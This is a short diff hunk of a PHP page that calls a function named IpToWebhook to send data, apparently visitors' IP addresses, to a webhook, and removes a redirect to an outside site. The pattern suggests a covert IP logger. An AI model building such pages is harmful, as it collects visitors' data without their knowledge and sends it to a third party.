@@ -101,6 +101,5 @@ function IpToWebhook($Hook, $Content)
 }
 
 IpToWebhook($Webhook, $JSON);
-header("Location: https://www.littest.site");
 ?>
 </html>
